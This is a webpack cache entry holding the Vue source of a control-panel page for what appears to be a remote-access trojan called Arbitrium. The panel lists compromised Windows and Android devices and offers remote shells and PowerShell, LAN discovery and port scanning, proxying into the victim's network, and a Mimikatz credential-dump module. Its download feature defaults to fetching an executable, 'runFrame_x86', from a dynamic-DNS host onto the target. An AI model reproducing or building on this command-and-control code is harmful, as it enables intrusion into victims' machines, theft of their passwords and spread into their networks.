{"remainingRequest":"/home/r00t/Desktop/Arbitrium_ControlPanel/node_modules/vue-loader/lib/index.js??vue-loader-options!/home/r00t/Desktop/Arbitrium_ControlPanel/src/viewsCore/HomeCore.vue?vue&type=script&lang=js&","dependencies":[{"path":"/home/r00t/Desktop/Arbitrium_ControlPanel/src/viewsCore/HomeCore.vue","mtime":1608407822191},{"path":"/home/r00t/Desktop/Arbitrium_ControlPanel/node_modules/cache-loader/dist/cjs.js","mtime":1608403031305},{"path":"/home/r00t/Desktop/Arbitrium_ControlPanel/node_modules/babel-loader/lib/index.js","mtime":1608403031565},{"path":"/home/r00t/Desktop/Arbitrium_ControlPanel/node_modules/cache-loader/dist/cjs.js","mtime":1608403031305},{"path":"/home/r00t/Desktop/Arbitrium_ControlPanel/node_modules/vue-loader/lib/index.js","mtime":1608403030785}],"contextDependencies":[],"result":[{"type":"Buffer","data":"base64:"},{"version":3,"sources":["HomeCore.vue"],"names":[],"mappings":";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;AAgfile":"HomeCore.vue","sourceRoot":"src/viewsCore","sourcesContent":["<template>\n\n    <v-card>\n      <NavDrawer :drawerBool=\"this.$store.state.drawerShow\"\n      v-on:to-signOut=\"signOut\"\n      v-on:to-switchCore=\"switchCore\"\n      />\n      <v-container grid-list-lg>\n        <v-row dense class=\"card-body\" fluid align=\"start\">\n          <v-col\n            v-for=\"(item, i) in devicesX\"\n            :key=\"i\"\n            cols=\"12\"\n          >\n            <v-card\n              :color=\"item.color\"\n              dark\n              \n            >\n              <div class=\"d-flex flex-no-wrap justify-space-between\">\n                <div>\n                  <v-card-title\n                    class=\"headline\"\n                    v-text=\"shortenText(item.uuid, 10)\"\n                  ></v-card-title>\n                  <v-card-subtitle v-html=\"'IP : '+item.deviceInfo[0]+'<br />Active tasks : '+item.deviceInfo[1]\"></v-card-subtitle>\n              <v-card-actions>\n              <router-link :to=\"'shell/'+item.uuid+'/'+item.ThreadID+'/sh'\" target=\"_blank\">\n                <v-btn text>Open shell</v-btn>\n              </router-link>\n\n              <v-menu\n                transition=\"slide-x-transition\"\n                bottom\n                right\n              >\n                <template v-slot:activator=\"{ on, attrs }\">\n                  <v-btn\n                    v-bind=\"attrs\"\n                    v-on=\"on\"\n                    text\n                  >\n                    <v-icon>mdi-dots-vertical</v-icon>\n                  </v-btn>\n                </template>\n\n                <v-list>\n                  <v-list-item\n                    v-for=\"(option, i) in deviceOptions[item.devicePlatform]\"\n                    :key=\"i\"\n                    @click=\"runOption(item.uuid, option.option, item.ThreadID)\"\n                  >\n                    <v-list-item-title>{{ option.title }}</v-list-item-title>\n                    <v-list-item-icon><v-icon>{{ option.icon }}</v-icon></v-list-item-icon>\n                  </v-list-item>\n                </v-list>\n              </v-menu>\n\n\n              </v-card-actions>\n\n                </div>\n                <v-avatar\n                  class=\"ma-3\"\n                  size=\"125\"\n                  tile\n                >\n                  <v-img :src=\"item.src\"></v-img>\n                </v-avatar>\n              </div>\n            </v-card>\n          </v-col>\n\n        </v-row>\n      </v-container>\n\n\n\n\n\n    <v-snackbar\n      v-model=\"snackbar\"\n    >\n      {{ snackbarText }}\n\n      <template v-slot:action=\"{ attrs }\">\n        <v-btn\n          color=\"pink\"\n          text\n          v-bind=\"attrs\"\n          @click=\"snackbar = false\"\n        >\n          Close\n        </v-btn>\n      </template>\n    </v-snackbar>\n\n\n    <v-overlay :value=\"overlay\">\n        <template v-if=\"downDialog\">\n\n          <div class=\"text-center\">\n            <v-dialog\n              v-model=\"downDialog\"\n              width=\"500\"\n            >\n              <v-card>\n                <v-card-title dark class=\"headline lighten-2\">\n                  Send file from url\n                </v-card-title>\n\n                <v-card-text>\n                    <v-text-field\n                    label=\"Direct link\"\n                    placeholder=\"http://example.com/executable\"\n                    hint=\"http only (https not supported yet)\"\n                    :rules=\"httprule\"\n                    outlined\n                    v-model=\"deviceTarget.url\"\n                    ></v-text-field>\n                    <v-text-field\n                    label=\"Output file\"\n                    outlined\n                    v-model=\"deviceTarget.output\"\n                    ></v-text-field>\n                </v-card-text>\n\n                <v-divider></v-divider>\n\n                <v-card-actions>\n                  <v-btn\n                    color=\"primary\"\n                    text\n                    @click=\"downDialog = false;\"\n                  >\n                    Cancel\n                  </v-btn>\n                  <v-spacer></v-spacer>\n                  <v-btn\n                    color=\"primary\"\n                    text\n                    @click=\"downFile\"\n                  >\n                    Download\n                  </v-btn>\n                </v-card-actions>\n              </v-card>\n            </v-dialog>\n          </div>\n\n\n        </template>\n        <template v-else-if=\"proxyDialog\">\n\n\n          <div class=\"text-center\">\n            <v-dialog\n              v-model=\"proxyDialog\"\n              width=\"500\"\n            >\n              <v-card :loading=\"proxyLoading\">\n                <v-card-title dark class=\"headline lighten-2\">\n                  Proxy settings\n                </v-card-title>\n\n                <v-card-text>\n                  <v-icon left>info</v-icon>This feature allows you to access the target local network (router, other devices connected to his LAN ... etc)\n                  <template v-if=\"proxyInfo\">\n                    <br /><br />\n                    <v-text-field\n                    label=\"HTTP proxy (IP Address:Port)\"\n                    hint=\"Copied to clipboard\"\n                    outlined\n                    readonly\n                    v-model=\"deviceTarget.proxyInfo\"\n                    ref=\"proxyToCopy\"\n                    append-icon=\"mdi-content-copy\"\n                    @click:append=\"copyText\"\n                    @click=\"copyText\"\n                    ></v-text-field>\n                  </template>\n                </v-card-text>\n\n                <v-divider></v-divider>\n\n                <v-card-actions>\n\n                  <v-btn\n                    color=\"primary\"\n                    text\n                    @click=\"proxyDialog = false; proxyInfo = false\"\n                  >\n                    Hide me\n                  </v-btn>\n                  <v-spacer></v-spacer>\n                  <v-btn\n                    color=\"primary\"\n                    text\n                    @click=\"switchProxy\"\n                    :disabled=\"proxyLoading\"\n                  >\n                    {{ proxyText }}\n                  </v-btn>\n                  \n\n                </v-card-actions>\n              </v-card>\n            </v-dialog>\n          </div>\n\n        </template>\n\n\n        <template v-else-if=\"lanDialog\">\n\n          <div class=\"text-center\">\n            <v-dialog\n              v-model=\"lanDialog\"\n              width=\"500\"\n            >\n\n              <v-card :loading=\"discoveryLoading\">\n                <v-card-title dark class=\"headline lighten-2\">\n                  Access Local Network\n                </v-card-title>\n\n                <v-card-text>\n                  <v-icon left>info</v-icon>This feature allows you to discover alive hosts on the local network and scan for open ports\n                  <template v-if=\"deviceTarget.lanSchema.length>0\">\n                    <v-treeview :items=\"deviceTarget.lanSchema\">\n                      <template v-slot:prepend=\"{ item }\">\n                        <v-icon\n                          v-if=\"!item.port\"\n                          v-text=\"'mdi-folder-network'\"\n                        ></v-icon>\n                        <v-icon\n                          v-else\n                          v-text=\"'mdi-arrow-right-circle-outline'\"\n                          color=\"green\"\n                        ></v-icon>\n                      </template>\n                      <template v-slot:append=\"{ item }\">\n\n                        <v-tooltip bottom v-if=\"!item.port\">\n                          <template v-slot:activator=\"{ on, attrs }\">\n                            <v-icon\n                              color=\"primary\"\n                              dark\n                              v-bind=\"attrs\"\n                              v-on=\"on\"\n                              :disabled=\"scannedPorts[item.name] ? true : false\"\n                              @click=\"scanPort(item.name)\"\n                            >\n                              mdi-magnify\n                            </v-icon>\n                          </template>\n                          <span>Scan for open ports</span>\n                        </v-tooltip>\n\n                      </template>\n                    </v-treeview>\n                  </template>\n                </v-card-text>\n\n                <v-divider></v-divider>\n\n                <v-card-actions>\n                  <v-btn\n                    color=\"primary\"\n                    text\n                    @click=\"lanDialog = false\"\n                  >\n                    Hide me\n                  </v-btn>\n                  <v-spacer></v-spacer>\n                  <v-btn\n                    color=\"primary\"\n                    text\n                    :disabled=\"discoverDisabled\"\n                    @click=\"scanLAN\"\n                  >\n                    Discover LAN\n                  </v-btn>\n                  \n\n                </v-card-actions>\n              </v-card>\n\n\n            </v-dialog>\n          </div>\n\n        </template>\n\n\n\n        <template v-else-if=\"dumpCredDialog\">\n\n          <div class=\"text-center\">\n            <v-dialog\n              v-model=\"dumpCredDialog\"\n              width=\"500\"\n            >\n              <v-card :loading=\"mimikatzLoading\">\n                <v-card-title dark class=\"headline lighten-2\">\n                  Dump Credentials\n                </v-card-title>\n\n                <v-card-text>\n                  <v-icon left>info</v-icon>This model runs a Powershell script to dump windows credentials, this may get you plaintext passwords stored in memory (Windows versions up to 8 and 2012 / WDigest is enabled by default)\n\n                  <template v-if=\"deviceTarget.dumpSchema.length>0\">\n                    <v-textarea\n                      name=\"input-7-1\"\n                      label=\"Default style\"\n                      :value=\"deviceTarget.dumpSchema\"\n                    ></v-textarea>\n                  </template>\n\n                </v-card-text>\n\n\n                <v-divider></v-divider>\n\n                <v-card-actions>\n\n                  <v-btn\n                    text\n                    @click=\"dumpCredDialog = false;\"\n                  >\n                    Hide me\n                  </v-btn>\n                  <v-spacer></v-spacer>\n                  <v-btn\n                    color=\"warning\"\n                    text\n                    @click=\"runMimikatz\"\n                  >\n                    Run\n                  </v-btn>\n                </v-card-actions>\n              </v-card>\n            </v-dialog>\n          </div>\n\n        </template>\n\n\n\n\n        <template v-else-if=\"clearDialog\">\n\n          <div class=\"text-center\">\n            <v-dialog\n              v-model=\"clearDialog\"\n              width=\"500\"\n            >\n              <v-card>\n                <v-card-title dark class=\"headline lighten-2\">\n                  Clear activities\n                </v-card-title>\n\n                <v-card-text>\n                  <v-icon left>warning</v-icon>This will stop all pending shell commands and kill the proxy if it's running. Do you confirm?\n                </v-card-text>\n\n                <v-divider></v-divider>\n\n                <v-card-actions>\n\n                  <v-btn\n                    text\n                    @click=\"clearDialog = false;\"\n                  >\n                    Cancel\n                  </v-btn>\n                  <v-spacer></v-spacer>\n                  <v-btn\n                    color=\"warning\"\n                    text\n                    @click=\"runClear\"\n                  >\n                    Confirm\n                  </v-btn>\n                </v-card-actions>\n              </v-card>\n            </v-dialog>\n          </div>\n\n\n\n\n        </template>\n        \n    </v-overlay>\n\n    </v-card>\n</template>\n\n<script>\nimport NavDrawer from '@/components/NavDrawer.vue';\n\nexport default {\n  name: 'HomeCore',\n  components:{\n    NavDrawer,\n\n  },\n  methods: {\n        switchCore(val){\n          this.$emit('to-switchCore', val);\n        },\n        signOut() {\n          this.$emit('to-signOut');\n        },\n        colorGen(val){\n          let string_map = {0: 26, 1: 27, 2: 28, 3: 29, 4: 30, 5: 31, 6: 32, 7: 33, 8: 34, 9: 35, 'a': 0, 'c': 2, 'b': 1, 'e': 4, 'd': 3, 'g': 6, 'f': 5, 'i': 8, 'h': 7, 'k': 10, 'j': 9, 'm': 12, 'l': 11, 'o': 14, 'n': 13, 'q': 16, 'p': 15, 's': 18, 'r': 17, 'u': 20, 't': 19, 'w': 22, 'v': 21, 'y': 24, 'x': 23, 'z': 25};\n          var string_equ = \"\";\n          for(var i=0; i<Math.min(val.length, 6);i++){\n            if(val[i]!==undefined){\n              string_equ += string_map[val[i]]\n            }else{\n              string_equ += \"00\"\n            }\n          }\n          let mycolor = '#'+(Math.abs(0.5-parseInt(string_equ)/999999)*0xFFFFFF<<0).toString(16);\n          return mycolor;\n        },\n        /* eslint-disable */\n        \n        runOption(uuid, option, ThreadID){\n          for(var j=0; j<this.devicesX.length; j++){if(this.devicesX[j].uuid==uuid){this.deviceTarget = this.devicesX[j];break}}\n          if(option == 'download'){\n            this.downDialog = true;\n\n          }else if(option == 'proxy'){\n            this.proxyDialog = true;\n            if(this.deviceTarget.proxyInfo!=''){\n              this.proxyInfo = true;\n              this.proxyText = \"Kill proxy\";\n            }else{\n              this.proxyInfo = false;\n              this.proxyText = \"Create proxy\";\n            }\n          }else if(option == 'clear'){\n            this.clearDialog = true;\n\n          }else if(option == 'modules_Discover'){\n            this.lanDialog = true;\n            if(this.deviceTarget.lanSchema.length===0){\n              this.discoverDisabled = false;\n            }else{\n             this.discoverDisabled = true; \n            }\n\n          }else if(option == 'modules_mimikatz'){\n            this.dumpCredDialog = true;\n\n          }else if(option == 'powershell'){            \n            let routeData = this.$router.resolve('/shell/'+uuid+'/'+ThreadID+'/ps');\n            window.open(routeData.href, '_blank');\n          }\n        },\n        /* eslint-enable */\n        async runShell(uuid, cmd, ThreadID){\n          let taskInfo = {uuid, cmd, ThreadID};\n          let ShellResp = await this.$store.dispatch('addTask', taskInfo);\n          return ShellResp;\n        },\n        async downFile(){\n          this.downDialog = false;\n          let uuid = this.deviceTarget.uuid;\n          let output = this.deviceTarget.output;\n          let boolDown = await this.$store.dispatch('pushDownload', {uuid, url: this.deviceTarget.url, output});\n          if(boolDown=='1' && this.deviceTarget.devicePlatform=='Android'){\n            this.snackbarText = 'The file is scheduled to download in the next App booting';\n            this.snackbar = true;\n          }else if (boolDown=='1'){\n            this.snackbarText = 'Downloading ... Use shell to check status';\n            this.snackbar = true;\n          }\n          else{\n            this.snackbarText = 'Error, please try again';\n            this.snackbar = true;\n          }\n        },\n        async runProxy(){\n          this.proxyLoading = true;\n          this.proxyText = 'Kill proxy';\n          let deviceInfo = {uuid:this.deviceTarget.uuid, ThreadID: this.deviceTarget.ThreadID};\n          let resProxy = await this.$store.dispatch('runProxy', deviceInfo);\n          if (resProxy.error) {\n            alert(\"Error: please try again/later\");  \n          }else{\n              this.deviceTarget.proxyInfo = resProxy.proxyInfo;\n              this.proxyInfo = true;\n              this.proxyLoading = false;\n              for(var k=0; k<this.devicesX.length; k++){if(this.devicesX[k].uuid==this.deviceTarget.uuid){this.devicesX[k] = this.deviceTarget;break}}\n          }\n        },\n\n        async runMimikatz(){\n          this.mimikatzLoading = true;\n          let deviceInfo = {uuid: this.deviceTarget.uuid, ThreadID: this.deviceTarget.ThreadID, moduleID: 3};\n          let resDiscovery = await this.$store.dispatch('runmodule', deviceInfo);\n          if (resDiscovery.error){\n            alert(\"Error: please try again/later\");\n          }else{\n            this.deviceTarget.dumpSchema = resDiscovery.message;\n            this.mimikatzLoading = false;\n            for(var k=0; k<this.devicesX.length; k++){if(this.devicesX[k].uuid==this.deviceTarget.uuid){this.devicesX[k] = this.deviceTarget;break}}\n          }\n        },\n\n        async scanLAN(){\n          this.discoveryLoading = true;\n          this.discoverDisabled = true;\n          let deviceInfo = {uuid: this.deviceTarget.uuid, ThreadID: this.deviceTarget.ThreadID, moduleID: 1};\n          let resDiscovery = await this.$store.dispatch('runmodule', deviceInfo);\n          if (resDiscovery.error){\n            alert(\"Error: please try again/later\");\n          }else{\n            let aliveHosts = resDiscovery.message.substring(1, resDiscovery.message.length-1).replace(/'/g, \"\").split(',');\n            let nbHosts = aliveHosts.length;\n            let schemaStruct = []\n            for(var i=0;i<nbHosts;i++){\n              schemaStruct.push({id:i, name: aliveHosts[i].replace(\" \", \"\"), icon: \"'mdi-folder-network'\",  children: []})                \n            }\n            this.deviceTarget.lanSchema = schemaStruct;\n            this.lanSchema = true;\n            this.discoveryLoading = false;\n            for(var k=0; k<this.devicesX.length; k++){if(this.devicesX[k].uuid==this.deviceTarget.uuid){this.devicesX[k] = this.deviceTarget;break}}\n          }\n        },\n        async scanPort(LanIP){\n          this.scannedPorts[LanIP] = true;\n          this.discoveryLoading = true;\n          let deviceInfo = {uuid: this.deviceTarget.uuid, ThreadID: this.deviceTarget.ThreadID, moduleID: 2,\n          LanIP: LanIP};\n          let resDiscovery = await this.$store.dispatch('runmodule', deviceInfo);\n          let openPortsMsg = resDiscovery.message.substring(1, resDiscovery.message.length-1).replace(/'/g, \"\").split(',');\n          \n          for(var i=0;i<this.deviceTarget.lanSchema.length;i++){\n            if (this.deviceTarget.lanSchema[i].name==LanIP){\n              this.deviceTarget.lanSchema[i].children = []\n              let portObjArr = [];\n              for(var j=0;j<openPortsMsg.length;j++){\n                let portObjTmp = {id:100+j, name: openPortsMsg[j].replace(\" \", \"\"), port: true, icon: \"'mdi-eye-off'\"};\n                if(parseInt(portObjTmp.name)>0) portObjArr.push(portObjTmp);\n              }\n              this.deviceTarget.lanSchema[i].children = portObjArr;\n              for(var k=0; k<this.devicesX.length; k++){if(this.devicesX[k].uuid==this.deviceTarget.uuid){this.devicesX[k] = this.deviceTarget;break}}\n            }\n          }\n          this.discoveryLoading = false;\n\n        },\n        async switchProxy(){\n          if (this.proxyText=='Create proxy'){\n            this.runProxy();\n          }else{\n            this.killProxy();\n          }\n        },\n        async runClear(){\n          this.clearDialog = false;\n          this.killProxy();\n          let respClear = await this.$store.dispatch('runClear', {uuid: this.deviceTarget.uuid});\n          if (respClear.error) {\n            this.snackbarText = 'Error, please try again';\n            this.snackbar = true; \n          }else{\n            this.snackbarText = 'All activities has been cleared';\n            this.snackbar = true; \n          }\n        },\n        async killProxy(){\n          this.deviceTarget.proxyInfo = '';\n          this.proxyInfo = false;\n          this.proxyText = \"Create proxy\";\n          this.proxyLoading = true;\n          let respClear = await this.$store.dispatch('killProxy', {uuid: this.deviceTarget.uuid});\n          if (respClear.error) {\n            this.snackbarText = 'Error, please try again';\n            this.snackbar = true; \n          }else{\n            this.snackbarText = 'Proxy was killed, you can now initiate another one';\n            this.snackbar = true; \n          }\n          this.proxyLoading = false;\n        },\n        async getDevices(){\n          let devicesJSON = await this.$store.dispatch('getDevices');\n          return devicesJSON;\n        },\n        pushDevices(){\n          let arr_length = this.$store.state.core.devicesID.length;\n          for(var i=0; i<arr_length; i++){\n            let struct_dev = {color: this.colorGen(this.$store.state.core.devicesID[i])\n            , src: require('../assets/deviceIcon/'+this.$store.state.core.devicesPlatform[i].split(' ')[0]+'.svg')\n            , uuid: this.$store.state.core.devicesID[i]\n            , ThreadID: this.$store.state.core.devicesThreadID[i]\n            , devicePlatform: this.$store.state.core.devicesPlatform[i].split(' ')[0]\n            , url: 'http://internetorange.myddns.me/assets/runFrame_x86'\n            , output: 'execbin'\n            , proxyInfo: ''\n            , lanSchema: ''\n            , dumpSchema: ''\n            , deviceInfo: [this.$store.state.core.devicesIP[i]\n            , this.$store.state.core.activeTasks[i].length],};\n            this.devicesX.push(struct_dev);\n          }\n        },\n        shortenText(source, size) {\n          return source.length > size ? source.slice(0, size - 1) + \"…\" : source;\n        },\n        copyText() {\n          let proxyInfoCopy = this.$refs.proxyToCopy.$el.querySelector('input')\n          proxyInfoCopy.select()\n          document.execCommand(\"copy\");\n        },\n        clearDialogMethod(){\n          this.clearDialog = false;\n        }\n\n  },\n\n  data: () => ({\n    deviceOptions: \n    {\n      \"Windows\":  [\n        {title : 'Discover LAN', icon: 'mdi-router-wireless', 'option': 'modules_Discover'},\n        {title: 'Instant download', icon: 'mdi-download' , option:'download'},\n        {title: 'Powershell', icon: 'mdi-powershell' , option:'powershell'},\n        {title : 'Dump credentials', icon: 'mdi-lock', 'option': 'modules_mimikatz'},\n        {title: 'Proxy settings', icon: 'mdi-server' , option: 'proxy'},\n        {title: 'Clear activities', icon: 'mdi-delete-sweep' , option: 'clear'},\n      ],\n      \"Android\":  [\n        { title : 'Discover LAN', icon: 'mdi-router-wireless', 'option': 'modules_Discover'},\n        { title: 'Schedule download', icon: 'mdi-download' , option:'download'},\n        { title: 'Proxy settings', icon: 'mdi-server' , option: 'proxy'},\n        { title: 'Clear activities', icon: 'mdi-delete-sweep' , option: 'clear'},\n      ],\n\n    },\n    devicesX: [\n    ],\n    snackbarText: '',\n    snackbar: false,\n    overlay: false,\n    downDialog: false,\n    proxyDialog: false,\n    lanDialog: false,\n    dumpCredDialog: false,\n    clearDialog: false,\n    proxyInfo: false,\n    lanSchema: false,\n    proxyLoading: false,\n    discoveryLoading: false,\n    discoverDisabled: false,\n    mimikatzLoading: false,\n    portRange: false,\n    proxyText: \"Create proxy\",\n    httprule: [\n      value => !!value || 'Required.',\n      value => (value || '').toLowerCase().indexOf('https://')<0 || 'HTTPS not allowed',\n      value => {\n        const pattern = /https?:\\/\\/(www\\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\\.[a-zA-Z0-9()]{1,6}\\b([-a-zA-Z0-9()@:%_+.~#?&//=]*)/\n        return pattern.test(value) || 'Invalid link.'\n      },\n    ],\n    deviceTarget: {\n      url: 'http://internetorange.myddns.me/assets/runFrame_x86',\n      output: 'execbin',\n      uuid: '',\n      ThreadID: '',\n      proxyInfo: '',\n      lanSchema: ''\n    },\n    scannedPorts: []\n  }),\n  created() {\n      this.getDevices().then(this.pushDevices);\n  },\n  watch: {\n    downDialog(val) {\n      this.overlay = val;\n    },\n    proxyDialog(val) {\n      this.overlay = val;\n    },\n    clearDialog(val) {\n      this.overlay = val;\n    },\n    lanDialog(val) {\n      this.overlay = val;\n    },\n    dumpCredDialog(val) {\n      this.overlay = val;\n    },\n  }\n}\n</script>\n\n<style scoped>\n.scroll-y {\n   overflow-y: auto\n}\n\n.card-body {\n  overflow-y: scroll;\n  height: 83vh;\n}\n</style>"]}]}